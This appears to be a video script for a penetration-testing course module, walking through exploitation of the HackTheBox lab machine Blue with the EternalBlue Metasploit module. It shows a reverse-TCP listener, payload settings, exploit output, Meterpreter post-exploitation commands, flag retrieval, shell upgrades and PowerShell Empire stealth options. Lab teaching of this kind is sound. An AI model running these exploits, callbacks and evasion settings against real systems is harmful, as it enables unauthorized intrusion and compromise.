# VIDEO 40: Hacking Mode
### Metasploit/Empire Integration, Framework Automation & Payload Delivery
**Suggested length:** 16–18 minutes
**License Tier:** Professional (Basic Hacking Mode) | Enterprise (Advanced Hacking Mode)
**Certification Relevance:** OSCP: Network Exploitation | CEH: System Hacking

---

## INTRO (0:00 – 1:45)

**[Screen: Huginn splash screen with Section 6 title card "Network and OS Exploitation"]**

> "Welcome to the final video in Section 6 — Hacking Mode. This is where everything comes together. In the previous video, we used the Exploit Database to identify CVE-2017-0143 and select the ms17_010_eternalblue Metasploit module for HTB Blue (see Video 39: Exploit Database). Now we're going to execute that exploit through Huginn's framework integration, establish a session on the target, and see how Huginn manages the post-exploitation interface."

**[Screen: Warning banner — red background with white text: "⚠️ LAB ENVIRONMENT ONLY — AUTHORIZED TESTING ONLY"]**

> "Mandatory safety statement. This video demonstrates active exploitation — gaining unauthorized access to a computer system. We are doing this against HTB Blue, an isolated lab machine designed for this exact purpose. Using exploitation tools against systems without explicit written authorization is a serious criminal offense. In professional penetration testing, exploitation only occurs after scope agreements, rules of engagement, and legal contracts are signed. Never exploit systems outside of authorized lab environments, CTF competitions, or contractually scoped engagements."

**[Screen: License tier comparison — Professional vs Enterprise Hacking Mode features]**

> "Hacking Mode has two tiers. Professional tier gives you Basic Hacking Mode — Metasploit and Empire framework integration with manual module selection, single-session support, and standard payloads. Enterprise tier unlocks Advanced Hacking Mode — automated exploit chaining, multi-session management, custom payload generation, advanced evasion techniques, and integration with Huginn's full post-exploitation framework. Today we'll primarily demonstrate the Professional tier workflow, and I'll point out where Enterprise features add capability."

**[Screen: Tier comparison table displayed prominently]**

> "Here's the breakdown. Professional: framework integration, module selection, payload configuration, single exploit execution, basic session interaction. Enterprise: all of that plus automated chain execution, multi-session management, custom payload encoding, C2 framework integration, and advanced persistence. Both tiers require HTB Blue spawned and your VPN connected."

| Feature | Professional | Enterprise |
|---------|:---:|:---:|
| Metasploit Integration | ✓ | ✓ |
| Empire Integration | ✓ | ✓ |
| Module Selection | ✓ | ✓ |
| Payload Configuration | ✓ | ✓ |
| Single Exploit Execution | ✓ | ✓ |
| Session Interaction | ✓ | ✓ |
| Automated Exploit Chaining | — | ✓ |
| Multi-Session Management | — | ✓ |
| Custom Payload Encoding | — | ✓ |
| C2 Framework Integration | — | ✓ |
| Advanced Persistence | — | ✓ |

---

## SECTION 1: Hacking Mode Architecture (1:45 – 3:30)

**[Screen: Architecture diagram showing Huginn Hacking Mode — PostExploitationFramework, ShellManager, ListenerManager, and SessionManager components]**

> "Hacking Mode is built on four core components. The PostExploitationFramework orchestrates the entire exploitation lifecycle — from session establishment through command execution, system enumeration, privilege escalation, and lateral movement. The ShellManager handles shell sessions — creating reverse shell listeners, establishing SSH connections, managing bind shells, and executing commands within sessions. The ListenerManager sets up and maintains network listeners for incoming connections, tracking active listeners and registering new sessions as they connect. And the SessionManager ties it all together, tracking which sessions belong to which targets and maintaining command history."

**[Screen: Code architecture showing PostExploitationFramework.establish_session() → ShellManager.create_reverse_shell_listener() → ListenerManager.create_listener()]**

> "The workflow flows top-down. When you execute an exploit, Huginn first establishes a listener through ListenerManager — opening a port and waiting for the callback. Then the exploit fires, the target connects back, ShellManager registers the new shell session, and PostExploitationFramework takes over for interaction. Each session gets a unique ID, command history tracking, and real-time status monitoring."

**[Screen: Huginn application — navigating from OS Exploits → Hacking Mode panel]**

> "In the UI, Hacking Mode lives under OS Exploits in the sidebar. The panel is divided into three areas — the Framework Configuration section at the top for setting up your exploit, the Active Listeners panel showing your open ports, and the Sessions panel below showing established connections. Let's set up our attack."

---

## SECTION 2: Listener Configuration (3:30 – 5:30)

**[Screen: Huginn Hacking Mode — Listener Configuration panel with fields for port, type, and bind address]**

> "Before we exploit anything, we need a listener ready to catch the callback. When EternalBlue fires successfully, the target will connect back to us on a port we specify. Let's configure that listener."

```bash
# Listener Configuration in Huginn
# ─────────────────────────────────
# Listener Type: reverse_tcp (meterpreter)
# Bind Address: 0.0.0.0 (all interfaces)
# Port: 4444
# Transport: TCP
#
# Huginn listener setup:
# [*] Creating listener on 0.0.0.0:4444
# [*] Listener type: reverse_tcp
# [*] Transport: TCP (standard)
# [*] Listener ID: LST-a7b3c9d2
# [+] Listener active — waiting for connections
```

**[Screen: Huginn Active Listeners panel showing the new listener — green status indicator, port 4444, 0 sessions]**

> "The listener is active. That green indicator means it's bound to port 4444 and accepting connections. The session count shows zero — we haven't exploited anything yet. In the background, ListenerManager is running an accept loop, ready to register any incoming connection as a new session."

**[Screen: Huginn showing network interface selection dropdown — tun0 (HTB VPN), eth0 (local), lo (loopback)]**

> "One important detail — your LHOST needs to be the IP address reachable from the target. Since we're connected to HTB via VPN, that's our tun0 interface address. Huginn's interface selector shows all available network interfaces with their IP addresses. Select tun0 — mine is 10.10.14.12 — and Huginn automatically configures the payload callback address."

```bash
# Network interface selection
# ─────────────────────────────
# Interface: tun0
# IP Address: 10.10.14.12
# Purpose: HTB VPN tunnel — reachable from lab machines
#
# This becomes LHOST in the Metasploit module configuration
```

---

## SECTION 3: Metasploit Module Configuration (5:30 – 8:30)

**[Screen: Huginn Hacking Mode — Framework Integration panel showing Metasploit module selection]**

> "Now we configure the exploit module. From the Exploit Database, we identified `exploit/windows/smb/ms17_010_eternalblue` as our target module. In Hacking Mode, enter the module path in the Module field — or if you clicked 'Launch in Hacking Mode' from the Exploit Database, it's pre-populated."

```bash
# Metasploit Module Configuration in Huginn
# ══════════════════════════════════════════
#
# Module: exploit/windows/smb/ms17_010_eternalblue
# Description: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
#
# Required Options:
# ┌──────────────┬─────────────────┬──────────────────────────┐
# │ Option       │ Value           │ Description              │
# ├──────────────┼─────────────────┼──────────────────────────┤
# │ RHOSTS       │ 10.10.10.40     │ Target IP address        │
# │ RPORT        │ 445             │ Target SMB port          │
# │ LHOST        │ 10.10.14.12    │ Callback address (tun0)  │
# │ LPORT        │ 4444            │ Callback port            │
# └──────────────┴─────────────────┴──────────────────────────┘
#
# Payload: windows/x64/meterpreter/reverse_tcp
# Target:  0 - Automatic Target
```

**[Screen: Huginn module options form — RHOSTS field filled with 10.10.10.40, LHOST with 10.10.14.12, payload dropdown showing meterpreter options]**

> "RHOSTS is our target — 10.10.10.40. RPORT stays at 445 for SMB. LHOST is our tun0 address for the callback — 10.10.14.12. LPORT is 4444, matching our listener. The payload selection is critical. We're choosing `windows/x64/meterpreter/reverse_tcp` — a staged 64-bit Meterpreter payload that connects back to us over TCP. Meterpreter gives us an interactive shell with built-in post-exploitation capabilities."

**[Screen: Payload selection dropdown expanded — showing available options: meterpreter/reverse_tcp, shell/reverse_tcp, meterpreter/bind_tcp, shell/bind_tcp, meterpreter/reverse_https]**

> "For payload selection, reverse_tcp is the standard choice for lab environments. In real engagements where you need to evade network monitoring, you might choose reverse_https to blend with normal HTTPS traffic — but that's an Enterprise tier feature with custom certificate configuration. For HTB, standard reverse_tcp is reliable and fast."

```bash
# Payload options explanation:
#
# windows/x64/meterpreter/reverse_tcp (SELECTED)
#   - Full Meterpreter shell with file operations, pivoting, etc.
#   - Connects back to attacker on LHOST:LPORT
#   - Best for: Full post-exploitation capability
#
# windows/x64/shell/reverse_tcp
#   - Basic Windows command shell (cmd.exe)
#   - Connects back to attacker
#   - Best for: When you only need command execution
#
# windows/x64/meterpreter/reverse_https (Enterprise tier)
#   - Meterpreter over HTTPS — encrypted, harder to detect
#   - Requires SSL certificate configuration
#   - Best for: Evasion in production environments
```

---

## SECTION 4: Exploit Execution (8:30 – 11:00)

**[Screen: Huginn Hacking Mode — "Execute Exploit" button prominently displayed with a confirmation dialog]**

> "Everything is configured. Before execution, Huginn shows a confirmation dialog summarizing what's about to happen — the target, the exploit, the payload, and the expected outcome. This is your last checkpoint. Confirm the target is within scope and you have authorization. Let's execute."

**[Screen: Huginn showing exploit execution progress — real-time output log]**

```bash
# Exploit Execution Output
# ════════════════════════
#
# [*] Started reverse TCP handler on 10.10.14.12:4444
# [*] 10.10.10.40:445 - Connecting to target for exploitation...
# [*] 10.10.10.40:445 - Connection established for exploitation
# [*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
# [*] 10.10.10.40:445 - Built a write-what-where primitive
# [*] 10.10.10.40:445 - Overwriting session security context token...
# [*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations...
# [*] 10.10.10.40:445 - Sending all but last fragment of exploit packet...
# [*] 10.10.10.40:445 - Starting non-paged pool grooming
# [*] 10.10.10.40:445 - Sending SMBv2 buffers
# [*] 10.10.10.40:445 - Closing SMBv1 connection creating free hole...
# [*] 10.10.10.40:445 - Sending final SMBv2 buffers
# [*] 10.10.10.40:445 - Sending last fragment of exploit packet!
# [*] 10.10.10.40:445 - Receiving response from exploit packet
# [+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
# [*] 10.10.10.40:445 - Sending egg to corrupted connection
# [*] 10.10.10.40:445 - Triggering free of corrupted buffer
# [*] Sending stage (200774 bytes) to 10.10.10.40
# [*] Meterpreter session 1 opened (10.10.14.12:4444 → 10.10.10.40:49158)
# [+] 10.10.10.40:445 - ════════════════════════════════════════
# [+] 10.10.10.40:445 - WIN! Meterpreter session established
# [+] 10.10.10.40:445 - ════════════════════════════════════════
```

**[Screen: Huginn showing "Session Established" notification — green banner with session ID and target info]**

> "We have a session. The exploit completed successfully — the EternalBlue kernel pool corruption overwrote the session security token, giving us SYSTEM-level code execution. Meterpreter connected back on port 4444, and Huginn registered it as Session 1. Notice the session opened at SYSTEM — we didn't need to escalate privileges. EternalBlue gives kernel-level access directly."

**[Screen: Huginn Sessions panel showing the new session — ID: SES-001, Type: meterpreter, Target: 10.10.10.40, User: NT AUTHORITY\SYSTEM, Status: Active]**

> "In the Sessions panel, you can see the session details. Session ID SES-001, type is Meterpreter, target is 10.10.10.40, and the user context is NT AUTHORITY\SYSTEM — the highest privilege level on Windows. The status shows Active with a green indicator. This session is now ready for interaction."

---

## SECTION 5: Session Interaction (11:00 – 13:30)

**[Screen: Huginn session interaction terminal — command input field with Meterpreter prompt]**

> "With the session established, Huginn's PostExploitationFramework provides an interactive terminal for running commands. You can type Meterpreter commands directly or use Huginn's built-in post-exploitation modules. Let's verify our access and gather system information."

```bash
# Session Interaction — System Enumeration
# ═══════════════════════════════════════════
#
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
# Computer    : HARIS-PC
# OS          : Windows 7 (6.1 Build 7601, Service Pack 1)
# Architecture: x64
# Meterpreter : x64/windows

meterpreter > ipconfig
# Interface 11 (Intel PRO/1000)
# ─────────────────────────────
# IPv4 Address: 10.10.10.40
# Subnet Mask:  255.255.255.0
# Gateway:      10.10.10.2

meterpreter > getprivs
# Enabled Process Privileges
# ──────────────────────────
# SeDebugPrivilege
# SeAssignPrimaryTokenPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeTakeOwnershipPrivilege
# SeImpersonatePrivilege
# SeLoadDriverPrivilege
```

**[Screen: Huginn system enumeration results panel — showing OS info, network configuration, and privileges in a structured view]**

> "SYSTEM access confirmed. We have every privilege available on Windows — SeDebugPrivilege for process injection, SeImpersonatePrivilege for token manipulation, SeBackupPrivilege for reading any file regardless of ACLs. This is complete system compromise."

**[Screen: Huginn showing the "Enumerate System" button — automated information gathering]**

> "Huginn's automated enumeration runs a comprehensive information gathering routine — user accounts, network connections, installed software, running processes, scheduled tasks, and more. Enterprise tier users get this automated with structured output. Let's grab the proof flags that HTB uses to validate the box is solved."

```bash
# Retrieving HTB proof flags
#
meterpreter > cat C:\\Users\\haris\\Desktop\\user.txt
# 4c546aea7dbee75cbd71de245c8deea9

meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
# ff548eb71e920ff6c08843ce0ded3e3b

# Both flags retrieved — full compromise confirmed
# User flag: accessible from haris context
# Root flag: accessible because we have SYSTEM privileges
```

**[Screen: Huginn displaying both flags retrieved — user.txt and root.txt with success indicators]**

> "Both flags retrieved. The user flag from haris's desktop and the root flag from Administrator's desktop. Because we're running as SYSTEM, we have unrestricted file access. In a real engagement, this is where you'd document the impact — complete access to all user data, ability to extract credentials, install persistence, and move laterally through the network."

---

## SECTION 6: Session Management and Shell Upgrades (13:30 – 15:30)

**[Screen: Huginn Session Management panel — showing session details, command history, and management options]**

> "Huginn tracks everything about your session. The command history shows every command executed with timestamps and output. The session info panel shows connection duration, bytes transferred, and current working directory. This audit trail is important for penetration test reporting — documenting exactly what was accessed and when."

```bash
# Session Management Commands
# ═══════════════════════════
#
# Background the session (keep it alive):
meterpreter > background
# [*] Backgrounding session 1...

# List all sessions:
huginn sessions> list
# ┌────────┬────────────┬─────────────┬──────────────────────┬────────┐
# │ ID     │ Type       │ Target      │ User                 │ Status │
# ├────────┼────────────┼─────────────┼──────────────────────┼────────┤
# │ SES-001│ Meterpreter│ 10.10.10.40 │ NT AUTHORITY\SYSTEM  │ Active │
# └────────┴────────────┴─────────────┴──────────────────────┴────────┘

# Interact with session again:
huginn sessions> interact SES-001
# [*] Interacting with session SES-001 (10.10.10.40)
meterpreter >
```

**[Screen: Huginn showing the session management toolbar — Interact, Background, Terminate, Export History buttons]**

> "You can background sessions to work on other tasks, interact again when needed, terminate when you're done, and export the full command history for your report. Enterprise tier supports multiple simultaneous sessions — imagine having shells on five machines in an Active Directory environment, pivoting between them as you map the domain."

**[Screen: Huginn shell upgrade options — showing "Upgrade to Meterpreter" for basic shells and "Drop to Shell" for meterpreter]**

> "If you established a basic shell instead of Meterpreter — say through a netcat listener — Huginn offers shell upgrades. The ShellManager can stabilize raw shells with Python PTY spawning, upgrade to Meterpreter using background session handlers, and provide command completion. Conversely, from Meterpreter you can drop to a native cmd.exe or PowerShell if needed."

```bash
# Shell upgrade commands (from basic shell to Meterpreter)
# Available through ShellManager
#
# Stabilize basic shell:
python -c 'import pty; pty.spawn("/bin/bash")'

# Upgrade from within Huginn:
huginn shell> upgrade SES-002 --type meterpreter --lhost 10.10.14.12 --lport 4445
# [*] Starting upgrade handler on 10.10.14.12:4445
# [*] Sending upgrade stager to session SES-002...
# [+] Upgrade successful — session SES-002 is now Meterpreter
```

---

## SECTION 7: Empire Framework Integration (15:30 – 16:30)

**[Screen: Huginn Hacking Mode — Empire tab showing PowerShell Empire integration]**

> "Beyond Metasploit, Huginn integrates with PowerShell Empire for scenarios where you need PowerShell-based post-exploitation. Empire is particularly useful in Active Directory environments where PowerShell is expected and less likely to trigger alerts. The integration works the same way — select the module, configure options, execute."

```bash
# Empire Framework Integration (Enterprise tier)
# ═══════════════════════════════════════════════
#
# Module: powershell/exploitation/ms17_010
# Listener: http (Empire HTTP listener)
# Stager: windows/launcher_bat
#
# Configuration:
# ┌──────────────┬─────────────────────────────────┐
# │ Target       │ 10.10.10.40                     │
# │ Listener     │ http://10.10.14.12:8080         │
# │ Agent Name   │ BLUE_AGENT                      │
# │ Kill Date    │ 2024-01-20                      │
# │ Working Hours│ 09:00-17:00 (stealth)           │
# └──────────────┴─────────────────────────────────┘
#
# Note: Empire integration with advanced options
# (Kill Date, Working Hours) is Enterprise tier only
```

**[Screen: Huginn showing Empire agent connected — agent name "BLUE_AGENT" with high-integrity access]**

> "Empire adds capabilities like agent kill dates — the implant self-destructs after a specified time — and working hours restrictions where the agent only communicates during business hours to blend with normal traffic patterns. These operational security features are Enterprise tier and crucial for red team engagements where stealth matters. For today's HTB demonstration, Metasploit with Meterpreter is the standard approach."

---

## SECTION 8: Certification Mapping and Practice (16:30 – 17:30)

**[Screen: Slide showing OSCP and CEH mapping for exploitation frameworks]**

> "Framework-based exploitation is central to OSCP's Network Exploitation domain. On the exam, you'll use Metasploit — with restrictions on how many machines you can use it against — to exploit buffer overflows, remote code execution vulnerabilities, and service misconfigurations. Understanding module configuration, payload selection, and session interaction is essential. For CEH, this maps to Module 5 — System Hacking, specifically gaining access through exploitation frameworks."

**[Screen: Practice recommendations — HTB machines for Metasploit practice]**

> "For practice beyond Blue, try HTB Legacy for MS08-067 exploitation — same workflow, older Windows XP target. HTB Jerry uses Tomcat exploitation through Metasploit's tomcat_mgr_upload module. THM's 'Metasploit' room provides a structured tutorial. Each teaches you the scan → match → configure → exploit → session workflow in different contexts."

---

## OUTRO (17:30 – end)

**[Screen: Summary slide — Hacking Mode: Framework Integration | Module Configuration | Exploit Execution | Session Establishment | Shell Management | Next: Section 7 — Stealth and Evasion]**

> "That wraps up Hacking Mode and Section 6. We configured a listener, set up the EternalBlue module with Meterpreter payload, executed the exploit against HTB Blue, established a SYSTEM-level session, interacted with the target, and explored session management and shell upgrades. We also touched on Empire integration for Advanced Hacking Mode. With this, you've completed the entire Exploit phase of the attack chain — from web application attacks in Section 5 through network and OS exploitation here in Section 6. Next up is Section 7 — Stealth and Evasion — where we learn to make our activities harder to detect. See you there."
